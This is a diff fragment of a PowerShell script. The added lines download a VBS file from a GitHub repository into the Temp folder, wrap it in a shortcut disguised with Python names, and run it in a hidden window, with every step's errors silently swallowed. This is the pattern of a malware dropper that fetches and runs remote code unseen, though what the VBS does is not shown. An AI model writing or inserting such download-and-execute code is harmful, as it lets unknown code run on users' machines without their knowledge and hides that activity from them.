@@ -45,9 +45,24 @@ try {
         -OutFile $pydataFile -ErrorAction Stop | Out-Null
 } catch {}
 
-# Execute pydata.ps1
+# Download python.vbs to Temp
 try {
-    & $pydataFile
+    $vbsFile = "$tempPath\python.vbs"
+    Invoke-WebRequest -Uri "https://github.com/KevinDark5/data/raw/refs/heads/main/python.vbs" `
+        -OutFile $vbsFile -ErrorAction Stop | Out-Null
 } catch {}
 
-# All notifications and paths are suppressed
+# Create Shortcut for python.vbs in Temp
+try {
+    $vbsShortcut = $WScriptShell.CreateShortcut("$tempPath\python.lnk")
+    $vbsShortcut.TargetPath = $vbsFile
+    $vbsShortcut.WorkingDirectory = $tempPath
+    $vbsShortcut.WindowStyle = 1
+    $vbsShortcut.Description = "Python VBS"
+    $vbsShortcut.Save()
+} catch {}
+
+# Execute the shortcut
+try {
+    Start-Process -FilePath "$tempPath\python.lnk" -WindowStyle Hidden
+} catch {}
